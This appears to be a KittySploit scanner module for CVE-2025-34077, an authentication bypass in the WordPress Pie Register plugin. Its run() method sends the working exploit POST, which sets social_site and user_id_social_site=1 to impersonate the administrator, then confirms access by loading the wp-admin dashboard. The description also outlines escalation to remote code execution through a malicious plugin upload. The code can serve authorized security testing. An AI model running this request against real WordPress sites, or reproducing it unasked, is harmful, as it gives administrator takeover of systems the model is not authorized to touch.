#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An authentication bypass vulnerability exists in the WordPress Pie Register plugin ≤ 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Pie Register <= 3.7.1.4 - Authentication Bypass Detection',
        'description': 'An authentication bypass vulnerability exists in the WordPress Pie Register plugin ≤ 3.7.1.4 that allows unauthenticated attackers to impersonate arbitrary users by submitting a crafted POST request to the login endpoint. By setting social_site=true and manipulating the user_id_social_site parameter, an attacker can generate a valid WordPress session cookie for any user ID, including administrators.Once authenticated, the attacker may exploit plugin upload functionality to install a malicious plugin containing arbitrary PHP code, resulting in remote code execution on the underlying server.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-plugin', 'pie-register', 'wp', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/MrjHaxcore/CVE-2025-34077',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-34077',
            'https://securityvulnerability.io/vulnerability/CVE-2025-34077',
        ],
        'cve': 'CVE-2025-34077',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='user_id_social_site=1&social_site=true&piereg_login_after_registration=true&_wp_http_referer=/login/&log=null&pwd=null\n')
        if not r:
            return False
        path = '/wp-admin/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Dashboard', 'Plugins', 'Edit Profile',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='WordPress Pie Register <= 3.7.1.4 - Authentication Bypass detected', path=path)
            return True
        return False

